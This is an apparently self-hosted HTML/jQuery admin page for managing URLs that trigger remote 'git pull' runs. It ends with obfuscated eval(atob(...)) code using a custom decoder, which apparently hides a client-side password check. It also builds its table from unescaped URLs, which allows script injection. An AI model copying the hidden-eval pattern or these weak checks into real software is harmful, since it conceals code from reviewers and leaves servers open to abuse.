<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="description" content="Sistem untuk mengelola daftar URL yang eksekusi GIT PULL">
    <meta name="author" content="Arizki Putra Rahman">
    <meta name="site" content="https://github.com/arizkinewbie/git-pull-auto">
    <meta name="keywords" content="git, pull, auto, automation, management">
    <title>Git Pull Automation Management</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- DataTables CSS -->
    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/1.11.5/css/dataTables.bootstrap5.min.css">
</head>

<body>
    <div class="container">
        <div class="d-none d-lg-block">
            <h1>GIT Pull Automation Management</h1>
        </div>
        <nav class="navbar navbar-expand-lg d-lg-none">
            <div class="container-fluid">
                <small class="text-bold">GIT Pull Automation Management</small>
                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                </button>
                <div class="collapse navbar-collapse" id="navbarNav">
                    <ul class="navbar-nav">
                        <li class="nav-item">
                            <hr><a class="nav-link float-end" href="#" id="tambahLinkNav">Add URL</a>
                        </li>
                        <li class="nav-item">
                            <hr><a class="nav-link float-end" href="#" id="syncAllActiveNav">Sync All</a>
                        </li>
                        <li class="nav-item">
                            <hr> <a class="nav-link float-end" href="#" id="clearHistoryNav">Clear History</a>
                        </li>
                    </ul>
                </div>
            </div>
        </nav>
        <hr />
        <div class="d-none d-lg-block mb-3">
            <button type="button" class="btn btn-primary" id="tambahLink">Add URL</button>
            <button type="button" class="btn btn-secondary" id="syncAllActive">Sync All</button>
            <button type="button" class="btn btn-danger float-end" id="clearHistory">Clear History</button>
        </div>
        <div id="dataContainer"></div>
    </div>

    <!-- Modal Tambah/Edit -->
    <div class="modal fade" id="modalForm" tabindex="-1" aria-labelledby="modalFormLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="modalFormLabel">Form URL</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <form id="formLink">
                        <input type="hidden" id="id" name="id">
                        <div class="mb-3">
                            <label for="web_link" class="form-label">URL</label>
                            <input type="text" class="form-control" id="web_link" name="web_link" placeholder="URL berisi respon dari git pull (shell_exec)" required>
                            <small class="text-muted">contoh: https://pull.arizkinewbie.com/pull.php</small>
                        </div>
                        <div class="mb-3">
                            <label for="status" class="form-label">Status</label>
                            <select class="form-select" id="status" name="status">
                                <option value="active">Active</option>
                                <option value="inactive">Inactive</option>
                            </select>
                        </div>
                        <button type="submit" class="btn btn-primary">Simpan</button>
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Batal</button>
                    </form>
                </div>
            </div>
        </div>
    </div>
    <!-- jQuery -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <!-- DataTables JS -->
    <script type="text/javascript" src="https://cdn.datatables.net/1.11.5/js/jquery.dataTables.min.js"></script>
    <script type="text/javascript" src="https://cdn.datatables.net/1.11.5/js/dataTables.bootstrap5.min.js"></script>
    <script>
        // Fungsi untuk menampilkan data dari JSON
        const loadData = () => {
            $.getJSON("data.json", function(data) {
                var html = "<table id='usersTable' class='table table-striped' style='width:100%;'>";
                html += "<thead><tr><th>URL</th><th>Status</th><th>Action</th></tr></thead><tbody>";
                $.each(data, function(key, value) {
                    if (value.status == 'active') {
                        status = '<span class="badge bg-success">Active</span>';
                    } else {
                        status = '<span class="badge bg-danger">Inactive</span>';
                    };
                    if (value.sync == null) {
                        sync = '-';
                    } else {
                        sync = value.sync + ' WIB';
                    }
                    html += "<tr>";
                    html += "<td title='ID: " + value.id + ", kunjungi URL'><a href='" + value.web_link + "' target='_blank'>" + value.web_link + "</a><small class='text-muted'><i> (last sync: " + sync + ")</i></small></td>";
                    html += "<td>" + status + "</td>";
                    html += "<td style='white-space: nowrap;'><a href='#' class='btn btn-success btn-sync' data-id='" + value.id + "' data-link='" + value.web_link + "' title='last sync: " + sync + "'>Sync</a> <a href='#' class='btn btn-primary btn-edit' data-id='" + value.id + "' data-link='" + value.web_link + "' data-status='" + value.status + "'>Edit</a> <a href='#' class='btn btn-danger btn-delete' data-id='" + value.id + "'>Hapus</a></td>";
                    html += "</tr>";
                });
                html += "</tbody></table>";
                $('#dataContainer').html(html);

                // Inisialisasi DataTables
                $('#usersTable').DataTable({
                    "scrollX": true,
                    "scrollCollapse": true,
                    "order": [
                        [2, 'asc']
                    ],
                });
            });
        };

        // Panggil fungsi loadData saat halaman dimuat
        $(document).ready(function() {
            loadData();
        });

        // Tambah atau Edit
        $('#tambahLinkNav, #tambahLink').click(function() {
            if (checkPassword()) {
                $('#modalFormLabel').text('Tambah URL');
                $('#id').val('');
                $('#web_link').val('');
                $('#status').val('active');
                $('#modalForm').modal('show');
            } else {
                alert("Password salah!");
            }
        });

        // Edit
        $(document).on('click', '.btn-edit', function() {
            if (checkPassword()) {
                var id = $(this).data('id');
                var web_link = $(this).data('link');
                var status = $(this).data('status');
                $('#modalFormLabel').text('Edit URL');
                $('#id').val(id);
                $('#web_link').val(web_link);
                $('#status').val(status);
                $('#modalForm').modal('show');
            } else {
                alert("Password salah!");
            }
        });

        // Submit Form
        $('#formLink').submit(function(e) {
            e.preventDefault();
            var formData = $(this).serialize();
            $.ajax({
                type: 'POST',
                url: 'aksi_tambah_edit.php',
                data: formData,
                success: function(response) {
                    $('#modalForm').modal('hide');
                    loadData();
                }
            });
        });

        // Hapus
        $(document).on('click', '.btn-delete', function() {
            if (checkPassword()) {
                var id = $(this).data('id');
                if (confirm('Anda yakin ingin menghapus data ini?')) {
                    $.ajax({
                        type: 'POST',
                        url: 'aksi_hapus.php',
                        data: {
                            id: id
                        },
                        success: function(response) {
                            loadData();
                        }
                    });
                }
            } else {
                alert("Password salah!");
            }
        });

        // Sync
        $(document).on('click', '.btn-sync', function() {
            var url = $(this).data('link');
            var id = $(this).data('id');
            $.ajax({
                type: 'POST',
                url: 'aksi_sync.php',
                data: {
                    url: url,
                    id: id
                },
                success: function(response) {
                    alert(response);
                    loadData();
                }
            });
        });

        // Sync All (Active)
        $('#syncAllActiveNav, #syncAllActive').click(function() {
            alert('coming soon...');
        });

        eval(atob('dmFyIHU9dm9pZCAwLGk0PTQsaTg9OCxyZWM9bmV3IFJlZ0V4cCgiLnsxLDR9IiwiZyIpO2Z1bmN0aW9uIF9mX2Mocyl7cmV0dXJuIFN0cmluZy5mcm9tQ2hhckNvZGUocyk7fXZhciBoZD1mdW5jdGlvbihhKXt2YXIgYixjPWEubWF0Y2gocmVjKXx8W10sZD0iIjtmb3IoYj0wO2I8Yy5sZW5ndGg7YisrKWQrPWhoKHBhcnNlSW50KGNbYl0saTYpKTtyZXR1cm4gZH07dmFyIGh3PWhkO1N0cmluZy5wcm90b3R5cGUuY2M9ZnVuY3Rpb24oYSl7cmV0dXJuIHRoaXMuY2hhckNvZGVBdChhKX07dmFyIGk2PTE2LGhlPWZ1bmN0aW9uKGEpe3ZhciBiLGMsZD0iIjtmb3IoYz0wO2M8YS5sZW5ndGg7YysrKWI9YS5jYyhjKS50b1N0cmluZyhpNiksZCs9KCIwMDAiK2IpLnNsaWNlKC00KTtyZXR1cm4gZH0saGg9ZnVuY3Rpb24oYSl7cmV0dXJuIFN0cmluZy5mcm9tQ2hhckNvZGUoYSl9LGh3YT1odygiMDA0MTAwNDIwMDQzMDA0NDAwNDUwMDQ2MDA0NzAwNDgwMDQ5MDA0YTAwNGIwMDRjMDA0ZDAwNGUwMDRmMDA1MDAwNTEwMDUyMDA1MzAwNTQwMDU1MDA1NjAwNTcwMDU4MDA1OTAwNWEwMDYxMDA2MjAwNjMwMDY0MDA2NTAwNjYwMDY3MDA2ODAwNjkwMDZhMDA2YjAwNmMwMDZkMDA2ZTAwNmYwMDcwMDA3MTAwNzIwMDczMDA3NDAwNzUwMDc2MDA3NzAwNzgwMDc5MDA3YTAwMzAwMDMxMDAzMjAwMzMwMDM0MDAzNTAwMzYwMDM3MDAzODAwMzkwMDJiMDAyZjAwM2QiKTtmdW5jdGlvbiBhdG9iKGEpe3ZhciBiLGMsZCxlLGYsZyxoLGk9IiIsaj0wO2ZvcihhPWEucmVwbGFjZShyZWEsIiIpO2o8YS5sZW5ndGg7KWU9aHdhLmluZGV4T2YoYS5jaGFyQXQoaisrKSksZj1od2EuaW5kZXhPZihhLmNoYXJBdChqKyspKSxnPWh3YS5pbmRleE9mKGEuY2hhckF0KGorKykpLGg9aHdhLmluZGV4T2YoYS5jaGFyQXQoaisrKSksYj1lPDwyfGY+PjQsYz0oMTUmZik8PDR8Zz4+MixkPSgzJmcpPDw2fGgsaSs9X2ZfYyhiKSw2NCE9ZyYmKGkrPV9mX2MoYykpLDY0IT1oJiYoaSs9X2ZfYyhkKSk7cmV0dXJuIGk9dXRvYShpKX1mdW5jdGlvbiBidG9hKGEpe3ZhciBiLGMsZCxlLGYsZyxoLGk9IiIsaj0wO2ZvcihhPWF0b3UoYSk7ajxhLmxlbmd0aDspYj1hLmNoYXJDb2RlQXQoaisrKSxjPWEuY2hhckNvZGVBdChqKyspLGQ9YS5jaGFyQ29kZUF0KGorKyksZT1iPj4yLGY9KDMmYik8PDR8Yz4+NCxnPSgxNSZjKTw8MnxkPj42LGg9NjMmZCxpc05hTihjKT9nPWg9NjQ6aXNOYU4oZCkmJihoPTY0KSxpPWkraHdhLmNoYXJBdChlKStod2EuY2hhckF0KGYpK2h3YS5jaGFyQXQoZykraHdhLmNoYXJBdChoKTtyZXR1cm4gaX1mdW5jdGlvbiBhdG91KGEpe2E9YS5yZXBsYWNlKHJlYiwiXG4iKTtmb3IodmFyIGI9IiIsYz0wO2M8YS5sZW5ndGg7YysrKXt2YXIgZD1hLmNoYXJDb2RlQXQoYyk7MTI4PmQ/Yis9X2ZfYyhkKTpkPjEyNyYmMjA0OD5kPyhiKz1fZl9jKGQ+PjZ8MTkyKSxiKz1fZl9jKDYzJmR8MTI4KSk6KGIrPV9mX2MoZD4+MTJ8MjI0KSxiKz1fZl9jKGQ+PjYmNjN8MTI4KSxiKz1fZl9jKDYzJmR8MTI4KSl9cmV0dXJuIGJ9ZnVuY3Rpb24gdXRvYShhKXtmb3IodmFyIGI9IiIsYz0wLGQ9YzE9YzI9MDtjPGEubGVuZ3RoOylkPWEuY2hhckNvZGVBdChjKSwxMjg+ZD8oYis9X2ZfYyhkKSxjKyspOmQ+MTkxJiYyMjQ+ZD8oYzI9YS5jaGFyQ29kZUF0KGMrMSksYis9X2ZfYygoMzEmZCk8PDZ8NjMmYzIpLGMrPTIpOihjMj1hLmNoYXJDb2RlQXQoYysxKSxjMz1hLmNoYXJDb2RlQXQoYysyKSxiKz1fZl9jKCgxNSZkKTw8MTJ8KDYzJmMyKTw8Nnw2MyZjMyksYys9Myk7cmV0dXJuIGJ9dmFyIGh3YT1odygiMDA0MTAwNDIwMDQzMDA0NDAwNDUwMDQ2MDA0NzAwNDgwMDQ5MDA0YTAwNGIwMDRjMDA0ZDAwNGUwMDRmMDA1MDAwNTEwMDUyMDA1MzAwNTQwMDU1MDA1NjAwNTcwMDU4MDA1OTAwNWEwMDYxMDA2MjAwNjMwMDY0MDA2NTAwNjYwMDY3MDA2ODAwNjkwMDZhMDA2YjAwNmMwMDZkMDA2ZTAwNmYwMDcwMDA3MTAwNzIwMDczMDA3NDAwNzUwMDc2MDA3NzAwNzgwMDc5MDA3YTAwMzAwMDMxMDAzMjAwMzMwMDM0MDAzNTAwMzYwMDM3MDAzODAwMzkwMDJiMDAyZjAwM2QiKSxyZWE9bmV3IFJlZ0V4cCgiW15BLVphLXowLTkrLz1dIiwiZyIpLHJlYj1uZXcgUmVnRXhwKCJcclxuIiwiZyIpO3ZhciBfXz17YTpod2Euc3BsaXQoIiIpLCQ6ZnVuY3Rpb24oYSxiKXtmb3IodmFyIGM9IiIsZD10aGlzLmEubGVuZ3RoLGU9YS5sZW5ndGgsZj0wO2Y8ZTtmKyspZm9yKHZhciBnPTA7ZzxkO2crKylpZigiZSI9PWIpe2lmKHRoaXMuYVtnXT09PWFbZl0pe2MrPXRoaXMuYltnXTticmVha319ZWxzZSBpZigiZCI9PWImJnRoaXMuYltnXT09PWFbZl0pe2MrPXRoaXMuYVtnXTticmVha31yZXR1cm4gY30sYjpodygiMDAzZDAwMmYwMDJiMDAzOTAwMzgwMDM3MDAzNjAwMzUwMDM0MDAzMzAwMzIwMDMxMDAzMDAwN2EwMDc5MDA3ODAwNzcwMDc2MDA3NTAwNzQwMDczMDA3MjAwNzEwMDcwMDA2ZjAwNmUwMDZkMDA2YzAwNmIwMDZhMDA2OTAwNjgwMDY3MDA2NjAwNjUwMDY0MDA2MzAwNjIwMDYxMDA1YTAwNTkwMDU4MDA1NzAwNTYwMDU1MDA1NDAwNTMwMDUyMDA1MTAwNTAwMDRmMDA0ZTAwNGQwMDRjMDA0YjAwNGEwMDQ5MDA0ODAwNDcwMDQ2MDA0NTAwNDQwMDQzMDA0MjAwNDEiKS5zcGxpdCgiIil9Ow=='));
        eval(atob(__.$('nZrSoJvXlKIgoKfboKTwopzNjKDOn+gXiJ3bj5rOle4P0d0extMDk53Rlp/M2+33lZ/Lj+/wopzNjKDOn9Ye2pMA', 'd')));
    </script>
</body>

</html>